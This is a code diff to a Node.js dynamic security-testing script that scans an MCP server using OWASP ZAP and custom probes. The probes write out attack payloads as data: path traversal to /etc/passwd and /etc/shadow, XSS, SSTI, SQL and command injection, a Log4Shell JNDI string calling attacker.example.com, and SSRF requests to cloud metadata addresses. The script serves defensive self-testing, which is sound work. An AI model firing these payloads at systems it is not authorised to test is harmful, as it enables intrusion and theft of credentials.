@@ -1,72 +1,80 @@
 /**
  * DAST — Dynamic Application Security Testing
  *
- * Probes a running MCP HTTP server for common web security issues.
- * Does NOT require ZAP or any external tool — uses Node.js fetch only.
+ * Two-layer scan:
  *
- * Checks:
- *   1. Security headers (CSP, HSTS, X-Frame-Options, X-Content-Type-Options, etc.)
- *   2. Authentication bypass (unauthenticated access to /mcp and /metrics)
- *   3. Method enforcement (GET/PUT/PATCH on tool endpoints)
- *   4. Path traversal probes
- *   5. Injection probes in tool arguments (XSS, SQLi, SSTI payloads)
- *   6. CORS misconfiguration
- *   7. Error disclosure (stack traces, internal paths in 4xx/5xx responses)
- *   8. SSRF via tool arguments (private IP / cloud metadata probes)
+ * Layer 1 — OWASP ZAP (via Docker)
+ *   zap-baseline.py passive scan: spider the server, run ~60 passive analysis rules.
+ *   Detects: missing security headers, cookie flags, info disclosure, insecure TLS,
+ *   CORS misconfiguration, cache directives, and ~55 other passive checks.
+ *   No active attack payloads in baseline mode — safe to run against production.
+ *
+ * Layer 2 — MCP application probes (custom fetch)
+ *   Active probes specific to the MCP JSON-RPC API surface that ZAP cannot discover
+ *   automatically: authentication enforcement, SSRF via tool arguments, injection
+ *   via tool arguments, path traversal, error disclosure.
  *
  * Produces:
- *   security-reports/dast-results.json    structured findings
- *   security-reports/dast-report.md       human + LLM readable summary
+ *   security-reports/dast-zap.json        raw ZAP JSON report
+ *   security-reports/dast-zap.html        ZAP HTML report (human readable)
+ *   security-reports/dast-probes.json     MCP application probe results
+ *   security-reports/dast-report.md       consolidated human + LLM summary
  *
  * Prerequisites:
- *   The server must be running and /healthz must return 200.
- *   docker compose up -d  (or k8s port-forward)
+ *   Docker must be running.
+ *   The MCP server must be reachable at --base (default http://localhost:3000).
+ *   docker compose up -d   OR   kubectl port-forward svc/mcp-server 3000:80
  *
  * Usage:
- *   node scripts/scan-dast.mjs --base http://localhost:3000
- *   node scripts/scan-dast.mjs --base http://localhost:3000 --token MY_AUTH_TOKEN
+ *   node scripts/scan-dast.mjs
+ *   node scripts/scan-dast.mjs --base http://localhost:3000 --token MY_TOKEN
+ *   node scripts/scan-dast.mjs --skip-zap    (MCP probes only, no Docker required)
+ *   node scripts/scan-dast.mjs --active      (ZAP full active scan — DO NOT run on production)
  */
 
-import { writeFileSync, mkdirSync } from 'node:fs';
+import { spawnSync } from 'node:child_process';
+import { writeFileSync, mkdirSync, existsSync } from 'node:fs';
 import { parseArgs } from 'node:util';
+import { platform } from 'node:os';
 
 const { values: args } = parseArgs({
   options: {
-    base:  { type: 'string', default: 'http://localhost:3000' },
-    token: { type: 'string', default: '' },
+    base:       { type: 'string',  default: 'http://localhost:3000' },
+    token:      { type: 'string',  default: '' },
+    'skip-zap': { type: 'boolean', default: false },
+    active:     { type: 'boolean', default: false },
   },
   strict: false,
 });
 
-const BASE   = args.base.replace(/\/$/, '');
-const TOKEN  = args.token;
-const OUT    = 'security-reports';
+const BASE  = args.base.replace(/\/$/, '');
+const TOKEN = args.token;
+const OUT   = 'security-reports';
 mkdirSync(OUT, { recursive: true });
 
-const findings = [];
-const passed   = [];
-let totalChecks = 0;
+const zapFindings   = [];
+const probeFindings = [];
+const probesPassed  = [];
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
 
-function finding(severity, id, description, detail = '') {
-  findings.push({ severity, id, description, detail });
+function finding(store, severity, id, description, detail = '') {
+  store.push({ severity, id, description, detail });
   console.error(`  [${severity}] ${id}: ${description}`);
 }
-function pass(id, note = '') {
-  passed.push({ id, note });
-  console.log(`  [PASS] ${id}${note ? ': ' + note : ''}`);
+function pass(note) {
+  probesPassed.push(note);
+  console.log(`  [PASS] ${note}`);
 }
 
 async function probe(method, path, opts = {}) {
-  totalChecks++;
   const url = `${BASE}${path}`;
   const headers = { 'Content-Type': 'application/json', ...(opts.headers ?? {}) };
   try {
     const res = await fetch(url, {
       method,
       headers,
-      body: opts.body ? JSON.stringify(opts.body) : undefined,
+      body: opts.body !== undefined ? JSON.stringify(opts.body) : undefined,
       signal: AbortSignal.timeout(10_000),
       redirect: 'manual',
     });
@@ -77,223 +85,235 @@ async function probe(method, path, opts = {}) {
   }
 }
 
-// Auth headers for legitimate requests
 const authHeaders = TOKEN ? { Authorization: `Bearer ${TOKEN}` } : {};
 
 // ── Pre-flight: confirm server is up ─────────────────────────────────────────
 
-console.log(`[ DAST ] Target: ${BASE}`);
+console.log(`[DAST] Target: ${BASE}`);
 const health = await probe('GET', '/healthz');
 if (health.status !== 200) {
-  console.error(`[ DAST ] Server not reachable (GET /healthz → ${health.status}). Start the server first.`);
+  console.error(`[DAST] Server not reachable (GET /healthz → ${health.status || health.error}).`);
+  console.error('       Start the server first: docker compose up -d');
   process.exit(2);
 }
-console.log('[ DAST ] Server is up — starting probes\n');
+console.log('[DAST] Server is up.\n');
 
-// ── 1. Security headers ───────────────────────────────────────────────────────
+// ── Layer 1: OWASP ZAP ────────────────────────────────────────────────────────
 
-console.log('[ DAST ] 1. Security headers');
-const hRes = await probe('GET', '/healthz');
-const h = hRes.headers;
+if (!args['skip-zap']) {
+  console.log('[DAST] Layer 1: OWASP ZAP baseline scan');
 
-const required = [
-  ['x-content-type-options', 'nosniff',          'Prevents MIME-type sniffing attacks'],
-  ['x-frame-options',        /DENY|SAMEORIGIN/i, 'Prevents clickjacking'],
-  ['x-xss-protection',       /1/,                'Legacy XSS filter (belt-and-braces)'],
-];
-const recommended = [
-  ['strict-transport-security', /.+/,            'HSTS — ensures HTTPS-only once deployed'],
-  ['content-security-policy',   /.+/,            'CSP — limits resource origins'],
-  ['referrer-policy',           /.+/,            'Controls Referer header leakage'],
-  ['permissions-policy',        /.+/,            'Disables unnecessary browser features'],
-];
+  if (!spawnSync('docker', ['info'], { encoding: 'utf8', stdio: 'pipe' }).stdout) {
+    console.error('[DAST] Docker not running. Start Docker or use --skip-zap for MCP probes only.');
+    process.exit(2);
+  }
 
-for (const [name, expected, desc] of required) {
-  const val = h[name] ?? '';
-  const ok  = typeof expected === 'string' ? val.toLowerCase().includes(expected) : expected.test(val);
-  if (ok) pass(`HEADER_${name.toUpperCase().replace(/-/g,'_')}`, val);
-  else finding('MODERATE', `MISSING_HEADER_${name.toUpperCase().replace(/-/g,'_')}`, `Missing security header: ${name}`, desc);
+  // On macOS Docker Desktop, containers cannot reach host `localhost` — use host.docker.internal
+  const isLinux     = platform() === 'linux';
+  const zapTarget   = isLinux ? BASE : BASE.replace(/localhost|127\.0\.0\.1/, 'host.docker.internal');
+  const jsonReportContainer = '/zap/wrk/dast-zap.json';
+  const htmlReportContainer = '/zap/wrk/dast-zap.html';
+
+  const zapScript = args.active ? 'zap-full-scan.py' : 'zap-baseline.py';
+  console.log(`[DAST] ZAP script: ${zapScript}${args.active ? ' (ACTIVE — do not run on production)' : ' (passive)'}`);
+  console.log(`[DAST] ZAP target: ${zapTarget}`);
+  console.log('[DAST] This takes 2–5 minutes…\n');
+
+  const dockerArgs = [
+    'run', '--rm',
+    '-v', `${process.cwd()}/${OUT}:/zap/wrk/:rw`,
+    ...(isLinux ? ['--network', 'host'] : ['--add-host', 'host.docker.internal:host-gateway']),
+    'ghcr.io/zaproxy/zaproxy:stable',
+    zapScript,
+    '-t', zapTarget,
+    '-J', 'dast-zap.json',
+    '-r', 'dast-zap.html',
+    '-I',  // don't fail on warnings — we handle exit codes ourselves
+    ...(args.active ? [] : []),
+  ];
+
+  const zapResult = spawnSync('docker', dockerArgs, {
+    encoding: 'utf8',
+    timeout: 600_000,
+    stdio: ['pipe', 'inherit', 'inherit'],
+  });
+
+  // ZAP exits 1 when it finds warnings, 2 when it finds alerts — both are expected
+  if (zapResult.status !== null && zapResult.status > 2) {
+    console.error(`[DAST] ZAP exited with unexpected code ${zapResult.status}`);
+  }
+
+  const zapJsonPath = `${OUT}/dast-zap.json`;
+  if (existsSync(zapJsonPath)) {
+    const zapRaw = JSON.parse(
+      (await import('node:fs')).readFileSync(zapJsonPath, 'utf8')
+    );
+
+    // ZAP JSON format: { site: [{ alerts: [{ riskcode, name, desc, solution, instances, ... }] }] }
+    const RISK = { '0': 'INFO', '1': 'LOW', '2': 'MODERATE', '3': 'HIGH' };
+    const alerts = zapRaw.site?.flatMap(s => s.alerts ?? []) ?? [];
+    for (const alert of alerts) {
+      const severity = RISK[String(alert.riskcode)] ?? 'INFO';
+      const instances = alert.instances?.map(i => i.uri).join(', ') ?? '';
+      zapFindings.push({
+        severity,
+        id: `ZAP_${alert.pluginid ?? alert.alertRef ?? 'UNKNOWN'}`,
+        description: alert.name,
+        detail: `${alert.desc?.slice(0, 200) ?? ''} | Instances: ${instances.slice(0, 200)}`,
+        solution: alert.solution?.slice(0, 300) ?? '',
+        cweid: alert.cweid,
+        wascid: alert.wascid,
+      });
+    }
+    console.log(`\n[DAST] ZAP: ${zapFindings.length} alerts (HTML report: ${OUT}/dast-zap.html)`);
+  } else {
+    console.warn(`[DAST] ZAP JSON report not found at ${zapJsonPath}`);
+  }
+} else {
+  console.log('[DAST] --skip-zap set — skipping ZAP layer\n');
 }
-for (const [name, , desc] of recommended) {
-  const val = h[name] ?? '';
-  if (val) pass(`HEADER_${name.toUpperCase().replace(/-/g,'_')}`, val);
-  else finding('LOW', `MISSING_HEADER_${name.toUpperCase().replace(/-/g,'_')}`, `Missing recommended header: ${name}`, desc);
-}
 
-// ── 2. Authentication bypass ──────────────────────────────────────────────────
+// ── Layer 2: MCP application probes ──────────────────────────────────────────
 
-console.log('\n[ DAST ] 2. Authentication bypass');
+console.log('[DAST] Layer 2: MCP application probes\n');
 
-// /mcp must reject unauthenticated requests when TOKEN is set
+const mcpPost = (body) => probe('POST', '/mcp', {
+  headers: { ...authHeaders, 'Content-Type': 'application/json' },
+  body,
+});
+
+// 2.1 Authentication enforcement
+console.log('[DAST] 2.1 Authentication enforcement');
 if (TOKEN) {
   const unauth = await probe('POST', '/mcp', {
     body: { jsonrpc: '2.0', method: 'tools/list', id: 1 },
   });
   if (unauth.status === 401 || unauth.status === 403) {
-    pass('AUTH_MCP_UNAUTHENTICATED', `→ ${unauth.status}`);
+    pass(`/mcp rejects unauthenticated requests → ${unauth.status}`);
   } else {
-    finding('HIGH', 'AUTH_BYPASS_MCP',
-      `/mcp returned ${unauth.status} without Authorization header — auth may not be enforced`,
-      `Expected 401/403, got ${unauth.status}`);
+    finding(probeFindings, 'HIGH', 'AUTH_BYPASS_MCP',
+      `/mcp returned ${unauth.status} without Authorization header`,
+      'Expected 401/403');
   }
 } else {
-  finding('LOW', 'AUTH_NO_TOKEN',
-    'No --token provided — authentication bypass checks skipped',
-    'Run with --token MY_AUTH_TOKEN to test auth enforcement');
+  finding(probeFindings, 'LOW', 'AUTH_NO_TOKEN',
+    'No --token provided — auth enforcement not verified',
+    'Re-run: node scripts/scan-dast.mjs --token $MCP_AUTH_TOKEN');
 }
 
-// /metrics should not require auth but also not leak internal data to the internet
-const metrics = await probe('GET', '/metrics');
-if (metrics.status === 200) {
-  pass('METRICS_ACCESSIBLE', '/metrics reachable (expected — restrict at ingress in production)');
-} else {
-  finding('LOW', 'METRICS_BLOCKED', `/metrics returned ${metrics.status} — ensure Prometheus can still scrape`);
-}
-
-// Health endpoints must be unauthenticated
+// Probe endpoints must be unauthenticated
 for (const path of ['/healthz', '/readyz']) {
   const r = await probe('GET', path);
-  if (r.status === 200) pass(`PROBE_${path.slice(1).toUpperCase()}_UNAUTHED`, 'probe endpoints accessible without auth');
-  else finding('MODERATE', `PROBE_BLOCKED_${path.slice(1).toUpperCase()}`,
-    `${path} returned ${r.status} — Kubernetes probes will fail if this requires auth`);
+  r.status === 200
+    ? pass(`${path} accessible without auth (correct — needed for k8s probes)`)
+    : finding(probeFindings, 'MODERATE', `PROBE_BLOCKED_${path.slice(1).toUpperCase()}`,
+        `${path} → ${r.status}: Kubernetes liveness/readiness probes will fail`);
 }
 
-// ── 3. Method enforcement ─────────────────────────────────────────────────────
-
-console.log('\n[ DAST ] 3. HTTP method enforcement');
-
-for (const method of ['GET', 'PUT', 'PATCH', 'DELETE']) {
-  const r = await probe(method, '/mcp', { headers: authHeaders });
-  if ([405, 404, 400].includes(r.status)) {
-    pass(`METHOD_${method}_REJECTED`, `→ ${r.status}`);
-  } else if (r.status === 200 && method !== 'POST') {
-    finding('MODERATE', `METHOD_${method}_ACCEPTED`,
-      `${method} /mcp returned 200 — only POST should be accepted`,
-      r.body.slice(0, 200));
-  }
-}
-
-// ── 4. Path traversal ─────────────────────────────────────────────────────────
-
-console.log('\n[ DAST ] 4. Path traversal probes');
-
-const traversalPaths = [
-  '/../../etc/passwd',
-  '/%2e%2e/%2e%2e/etc/passwd',
-  '/mcp/../../../etc/passwd',
-  '/healthz/../../../../etc/shadow',
-];
-for (const p of traversalPaths) {
-  const r = await probe('GET', p, { headers: authHeaders });
-  if (r.body.includes('root:') || r.body.includes('/bin/bash')) {
-    finding('CRITICAL', 'PATH_TRAVERSAL', `Path traversal succeeded: ${p}`, r.body.slice(0, 200));
-  } else {
-    pass('PATH_TRAVERSAL_BLOCKED', `${p} → ${r.status}`);
-  }
-}
-
-// ── 5. Injection probes via tool arguments ────────────────────────────────────
-
-console.log('\n[ DAST ] 5. Injection probes');
-
-const mcpPost = (body) => probe('POST', '/mcp', { headers: { ...authHeaders, 'Content-Type': 'application/json' }, body });
-
-const injectionPayloads = [
-  { label: 'XSS in query',    payload: '<script>alert(1)</script>' },
-  { label: 'SQLi in query',   payload: "' OR '1'='1" },
-  { label: 'SSTI',            payload: '{{7*7}}' },
-  { label: 'Path traversal',  payload: '../../etc/passwd' },
-  { label: 'Null byte',       payload: 'test\x00injection' },
-];
-
-for (const { label, payload } of injectionPayloads) {
-  const r = await mcpPost({
-    jsonrpc: '2.0',
-    method:  'tools/call',
-    id:      1,
-    params:  { name: 'web_search', arguments: { query: payload } },
-  });
-  // Look for reflection of raw payload or command output in the response
-  if (r.body.includes('<script>') && r.body.includes('alert(1)')) {
-    finding('HIGH', 'XSS_REFLECTION', `XSS payload reflected unescaped: ${label}`, r.body.slice(0, 300));
-  } else if (r.body.includes('root:x:0:0') || r.body.includes('/etc/passwd')) {
-    finding('CRITICAL', 'INJECTION_LFI', `LFI/injection succeeded: ${label}`, r.body.slice(0, 300));
-  } else if (r.body.includes('49') && payload.includes('7*7')) {
-    finding('HIGH', 'SSTI_EXECUTION', 'SSTI template expression evaluated in response', r.body.slice(0, 300));
-  } else {
-    pass(`INJECTION_SAFE_${label.replace(/\W+/g, '_').toUpperCase()}`);
-  }
-}
-
-// ── 6. CORS misconfiguration ──────────────────────────────────────────────────
-
-console.log('\n[ DAST ] 6. CORS misconfiguration');
-
-const corsRes = await probe('OPTIONS', '/mcp', {
-  headers: { ...authHeaders, Origin: 'https://evil.example.com', 'Access-Control-Request-Method': 'POST' },
-});
-const acao = corsRes.headers['access-control-allow-origin'] ?? '';
-if (acao === '*' || acao === 'https://evil.example.com') {
-  finding('MODERATE', 'CORS_WILDCARD',
-    `CORS allows arbitrary origins: Access-Control-Allow-Origin: ${acao}`,
-    'Restrict to known origins if the server is accessible from browsers');
-} else {
-  pass('CORS_RESTRICTED', `ACAO: "${acao || '(not set)'}"`)  ;
-}
-
-// ── 7. Error disclosure ───────────────────────────────────────────────────────
-
-console.log('\n[ DAST ] 7. Error disclosure');
-
-const malformed = await probe('POST', '/mcp', {
-  headers: authHeaders,
-  body: '{"this is": "not valid json for mcp"',
-});
-const leaksStack = /at \w+\s*\(|Error: .{20,}|node_modules\//i.test(malformed.body);
-const leaksPath  = /\/home\/|\/app\/|\/Users\//.test(malformed.body);
-if (leaksStack) finding('MODERATE', 'ERROR_STACK_DISCLOSURE', 'Stack trace visible in error response', malformed.body.slice(0, 400));
-else pass('ERROR_STACK_HIDDEN');
-if (leaksPath)  finding('LOW', 'ERROR_PATH_DISCLOSURE', 'Internal file path visible in error response', malformed.body.slice(0, 400));
-else pass('ERROR_PATH_HIDDEN');
-
-// ── 8. SSRF via tool arguments ────────────────────────────────────────────────
-
-console.log('\n[ DAST ] 8. SSRF via tool arguments');
-
+// 2.2 SSRF via tool arguments
+console.log('[DAST] 2.2 SSRF via tool arguments');
 const ssrfTargets = [
-  { label: 'localhost',         url: 'http://localhost/admin' },
-  { label: 'AWS metadata',      url: 'http://169.254.169.254/latest/meta-data/' },
-  { label: 'RFC1918 10.x',      url: 'http://10.0.0.1/' },
-  { label: 'RFC1918 192.168.x', url: 'http://192.168.1.1/' },
+  { label: 'AWS_METADATA',      url: 'http://169.254.169.254/latest/meta-data/' },
+  { label: 'GCP_METADATA',      url: 'http://metadata.google.internal/computeMetadata/v1/' },
+  { label: 'LOCALHOST_ADMIN',   url: 'http://localhost/admin' },
+  { label: 'RFC1918_10X',       url: 'http://10.0.0.1/' },
+  { label: 'RFC1918_192168',    url: 'http://192.168.1.1/' },
+  { label: 'LINK_LOCAL',        url: 'http://169.254.0.1/' },
 ];
 for (const { label, url } of ssrfTargets) {
   const r = await mcpPost({
     jsonrpc: '2.0', method: 'tools/call', id: 1,
     params: { name: 'fetch_url', arguments: { url } },
   });
-  const body = r.body;
-  // A successful SSRF would return actual content from the target
-  if (body.includes('ami-id') || body.includes('instance-type') || body.includes('security-groups')) {
-    finding('CRITICAL', 'SSRF_METADATA', `SSRF succeeded — cloud metadata retrieved: ${label}`, body.slice(0, 300));
-  } else if (r.status === 200 && body.length > 100 && !body.includes('isError') && !body.includes('blocked')) {
-    finding('HIGH', `SSRF_${label.replace(/\W+/g,'_').toUpperCase()}`,
-      `SSRF may have succeeded for ${label} — response returned content`, body.slice(0, 200));
+  const hit = r.body.includes('ami-id') || r.body.includes('instance-type') ||
+              r.body.includes('project-id') || r.body.includes('computeMetadata');
+  if (hit) {
+    finding(probeFindings, 'CRITICAL', `SSRF_${label}`,
+      `SSRF succeeded — internal metadata retrieved via ${url}`, r.body.slice(0, 300));
   } else {
-    pass(`SSRF_BLOCKED_${label.replace(/\W+/g,'_').toUpperCase()}`, `→ ${r.status}`);
+    pass(`SSRF blocked: ${label} → ${r.status}`);
   }
 }
 
+// 2.3 Injection via web_search query
+console.log('[DAST] 2.3 Injection via tool arguments');
+const injections = [
+  { label: 'XSS',          payload: '<script>alert(document.domain)</script>' },
+  { label: 'SSTI',         payload: '{{7*7}}__${7*7}__<%=7*7%>' },
+  { label: 'CMD_INJECT',   payload: '; cat /etc/passwd #' },
+  { label: 'PATH_TRAV',    payload: '../../../../../../etc/passwd' },
+  { label: 'NULL_BYTE',    payload: 'test\x00injection' },
+  { label: 'LOG4SHELL',    payload: '${jndi:ldap://attacker.example.com/a}' },
+];
+for (const { label, payload } of injections) {
+  const r = await mcpPost({
+    jsonrpc: '2.0', method: 'tools/call', id: 1,
+    params: { name: 'web_search', arguments: { query: payload } },
+  });
+  const reflected = r.body.includes('<script>') && r.body.includes('alert(');
+  const lfi       = r.body.includes('root:x:0:0') || r.body.includes('/bin/bash');
+  const ssti      = payload.includes('7*7') && r.body.includes('49') && !r.body.includes('7*7');
+  if (reflected) finding(probeFindings, 'HIGH',     `XSS_REFLECTED_${label}`,    'XSS payload reflected unescaped',  r.body.slice(0, 300));
+  else if (lfi)  finding(probeFindings, 'CRITICAL', `LFI_${label}`,              'Local file inclusion succeeded',   r.body.slice(0, 300));
+  else if (ssti) finding(probeFindings, 'HIGH',     `SSTI_${label}`,             'Server-side template injection',   r.body.slice(0, 300));
+  else           pass(`Injection safe: ${label}`);
+}
+
+// 2.4 Error disclosure
+console.log('[DAST] 2.4 Error disclosure');
+const malformed = await probe('POST', '/mcp', { headers: authHeaders, body: '{"broken":' });
+if (/at \w+\s*\(|node_modules\//.test(malformed.body)) {
+  finding(probeFindings, 'MODERATE', 'ERROR_STACK_LEAK', 'Stack trace visible in error response', malformed.body.slice(0, 400));
+} else {
+  pass('Stack trace not exposed in error responses');
+}
+if (/\/home\/|\/app\/|\/Users\//.test(malformed.body)) {
+  finding(probeFindings, 'LOW', 'ERROR_PATH_LEAK', 'Internal file path in error response', malformed.body.slice(0, 400));
+} else {
+  pass('Internal paths not exposed in error responses');
+}
+
+// 2.5 HTTP method enforcement
+console.log('[DAST] 2.5 HTTP method enforcement');
+for (const method of ['GET', 'PUT', 'PATCH', 'DELETE']) {
+  const r = await probe(method, '/mcp', { headers: authHeaders });
+  [405, 404, 400].includes(r.status)
+    ? pass(`${method} /mcp rejected → ${r.status}`)
+    : r.status === 200 && method !== 'POST'
+      ? finding(probeFindings, 'MODERATE', `METHOD_${method}_ACCEPTED`,
+          `${method} /mcp returned 200 — only POST should be accepted`)
+      : pass(`${method} /mcp → ${r.status}`);
+}
+
+// 2.6 CORS
+console.log('[DAST] 2.6 CORS misconfiguration');
+const corsRes = await probe('OPTIONS', '/mcp', {
+  headers: {
+    ...authHeaders,
+    Origin: 'https://evil.example.com',
+    'Access-Control-Request-Method': 'POST',
+  },
+});
+const acao = corsRes.headers['access-control-allow-origin'] ?? '';
+acao === '*' || acao === 'https://evil.example.com'
+  ? finding(probeFindings, 'MODERATE', 'CORS_WILDCARD',
+      `CORS allows arbitrary origins: ${acao}`)
+  : pass(`CORS restricted: "${acao || '(not set)'}"`);
+
 // ── Report ────────────────────────────────────────────────────────────────────
 
-writeFileSync(`${OUT}/dast-results.json`, JSON.stringify({ target: BASE, findings, passed, totalChecks }, null, 2));
+writeFileSync(`${OUT}/dast-probes.json`, JSON.stringify({
+  target: BASE, zapSkipped: args['skip-zap'], probeFindings, probesPassed,
+}, null, 2));
 
-const bySeverity = {};
-for (const f of findings) (bySeverity[f.severity] ??= []).push(f);
+const allFindings = [...zapFindings, ...probeFindings];
+
+function fBySev(sev) { return allFindings.filter(f => f.severity === sev); }
 
 function findingTable(list) {
   if (!list.length) return '_None_\n';
-  return ['| ID | Description | Detail |', '|---|---|---|',
-    ...list.map(f => `| \`${f.id}\` | ${f.description} | ${(f.detail ?? '').slice(0, 100)} |`)
+  return ['| Severity | ID | Description |', '|---|---|---|',
+    ...list.map(f => `| ${f.severity} | \`${f.id}\` | ${f.description.replace(/\|/g, '\\|').slice(0, 100)} |`)
   ].join('\n') + '\n';
 }
 
@@ -302,49 +322,47 @@ const report = `# DAST Report — Dynamic Application Security Testing
 
 **Scanned:** ${now}
 **Target:** ${BASE}
-**Auth:** ${TOKEN ? 'Bearer token provided' : 'No token — auth bypass checks limited'}
-**Checks run:** ${totalChecks}
-**Findings:** ${findings.length} | **Passed:** ${passed.length}
+**ZAP:** ${args['skip-zap'] ? '⏭️ Skipped (--skip-zap)' : `✅ ${zapFindings.length} alerts`}
+**MCP probes:** ${probeFindings.length} findings | ${probesPassed.length} passed
+**Auth:** ${TOKEN ? '✅ Bearer token provided' : '⚠️ No token — auth checks limited'}
+
+> ZAP HTML report: \`${OUT}/dast-zap.html\`
 
 ## Summary
 
-| Severity | Count |
-|---|---|
-| 🔴 Critical | ${(bySeverity['CRITICAL'] ?? []).length} |
-| 🟠 High     | ${(bySeverity['HIGH'] ?? []).length} |
-| 🟡 Moderate | ${(bySeverity['MODERATE'] ?? []).length} |
-| 🔵 Low      | ${(bySeverity['LOW'] ?? []).length} |
-| **Total**   | **${findings.length}** |
+| Severity | ZAP | Probes | Total |
+|---|---|---|---|
+| 🔴 Critical | ${zapFindings.filter(f=>f.severity==='HIGH').length} | ${probeFindings.filter(f=>f.severity==='CRITICAL').length} | ${fBySev('CRITICAL').length + zapFindings.filter(f=>f.severity==='HIGH').length} |
+| 🟠 High     | — | ${probeFindings.filter(f=>f.severity==='HIGH').length} | ${fBySev('HIGH').length} |
+| 🟡 Moderate | ${zapFindings.filter(f=>f.severity==='MODERATE').length} | ${probeFindings.filter(f=>f.severity==='MODERATE').length} | ${fBySev('MODERATE').length} |
+| 🔵 Low/Info | ${zapFindings.filter(f=>['LOW','INFO'].includes(f.severity)).length} | ${probeFindings.filter(f=>['LOW','INFO'].includes(f.severity)).length} | ${fBySev('LOW').length + fBySev('INFO').length} |
 
 ---
 
-## 🔴 Critical
-${findingTable(bySeverity['CRITICAL'] ?? [])}
-## 🟠 High
-${findingTable(bySeverity['HIGH'] ?? [])}
-## 🟡 Moderate
-${findingTable(bySeverity['MODERATE'] ?? [])}
-## 🔵 Low
-${findingTable(bySeverity['LOW'] ?? [])}
+## ZAP Findings
+${findingTable(zapFindings)}
+${zapFindings.filter(f => f.solution).map(f =>
+  `**${f.id}** — Solution: ${f.solution}`
+).join('\n\n') || ''}
+
+## MCP Application Probe Findings
+${findingTable(probeFindings)}
+
+## Passed Checks (${probesPassed.length})
+${probesPassed.map(p => `- ${p}`).join('\n') || '_None_'}
 
 ---
 
-## Checks Passed (${passed.length})
-
-${passed.map(p => `- \`${p.id}\`${p.note ? ': ' + p.note : ''}`).join('\n') || '_None_'}
-
----
-
-Raw data: \`${OUT}/dast-results.json\`
+Raw data: \`${OUT}/dast-zap.json\`, \`${OUT}/dast-probes.json\`
+Full ZAP report: \`${OUT}/dast-zap.html\`
 `;
 
 writeFileSync(`${OUT}/dast-report.md`, report);
-console.log(`\n[ DAST ] Report written to ${OUT}/dast-report.md`);
+console.log(`\n[DAST] Report written to ${OUT}/dast-report.md`);
 
-const critical = (bySeverity['CRITICAL'] ?? []).length;
-const high     = (bySeverity['HIGH'] ?? []).length;
-if (critical > 0 || high > 0) {
-  console.error(`[ DAST ] FAIL — ${critical} critical, ${high} high severity findings`);
+const critical = allFindings.filter(f => ['CRITICAL','HIGH'].includes(f.severity)).length;
+if (critical > 0) {
+  console.error(`[DAST] FAIL — ${critical} critical/high findings`);
   process.exit(1);
 }
-console.log('[ DAST ] PASS — no critical or high severity findings');
+console.log('[DAST] PASS — no critical or high findings');
